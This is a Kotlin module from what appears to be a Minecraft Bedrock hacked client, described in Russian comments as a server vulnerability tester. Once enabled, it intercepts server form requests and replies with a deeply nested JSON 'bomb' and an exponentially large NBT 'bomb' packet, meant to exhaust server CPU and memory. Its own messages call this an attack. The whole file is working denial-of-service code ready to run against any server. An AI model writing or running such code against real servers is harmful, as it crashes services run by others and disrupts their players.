package com.mucheng.mucute.client.game.module.misc

import com.mucheng.mucute.client.game.InterceptablePacket
import com.mucheng.mucute.client.game.Module
import com.mucheng.mucute.client.game.ModuleCategory
import org.cloudburstmc.math.vector.Vector3i
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.nbt.NbtMap
import org.cloudburstmc.protocol.bedrock.packet.BlockEntityDataPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket

/**
 * Модуль для продвинутого тестирования уязвимостей сервера с использованием
 * алгоритмических атак ("бомб"), вызывающих высокую нагрузку на CPU/RAM.
 */
class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {

    // --- Настройки ---
    private val testWithDeepJson by boolValue("Test Deep JSON Bomb", true)
    private val testWithNbtBomb by boolValue("Test NBT Bomb", true)
    
    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..2000)
    
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 800, 100..5000)

    private val nbtBombDepth by intValue("NBT Bomb Depth", 12, 5..20)
    private val nbtBombWidth by intValue("NBT Bomb Width", 10, 5..20)

    override fun onEnabled() {
        super.onEnabled()
        session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
        super.onDisabled()
        session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is ModalFormRequestPacket) {
            interceptablePacket.intercept()
            
            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")

            GlobalScope.launch {
                if (testWithDeepJson.value) {
                    sendDeeplyNestedFormResponse(packet.formId)
                    delay(attackDelay.value.toLong())
                }
                if (testWithNbtBomb.value) {
                    sendNbtBombPacket()
                }
                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
    }

    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            val responsePacket = ModalFormResponsePacket()
            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
            responsePacket.setFormId(formId)

            var maliciousJson = "\"leaf\""
            for (i in 1..jsonNestingDepth.value) {
                maliciousJson = "{\"key\":$maliciousJson}"
            }
            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
            responsePacket.setFormData(maliciousJson)
            
            session.send(responsePacket)
            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: ${jsonNestingDepth.value}).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
        }
    }

    private fun sendNbtBombPacket() {
        try {
            val nbtPacket = BlockEntityDataPacket()
            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
            nbtPacket.setBlockPosition(Vector3i.ZERO)

            val payload: Any = "payload_data"

            var currentLevel: Any = payload
            for (d in 1..nbtBombDepth.value) {
                val nextLevel = mutableListOf<Any>()
                for (w in 1..nbtBombWidth.value) {
                    nextLevel.add(currentLevel)
                }
                currentLevel = nextLevel
            }
            
            val root = NbtMap.of("bomb", currentLevel)

            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
            nbtPacket.setData(root)
            
            session.send(nbtPacket)
            val totalElements = Math.pow(nbtBombWidth.value.toDouble(), nbtBombDepth.value.toDouble()).toLong()
            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба (глубина: ${nbtBombDepth.value}, ширина: ${nbtBombWidth.value}, ~${totalElements} элементов).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке NBT-бомбы: ${e.message}")
        }
    }
}
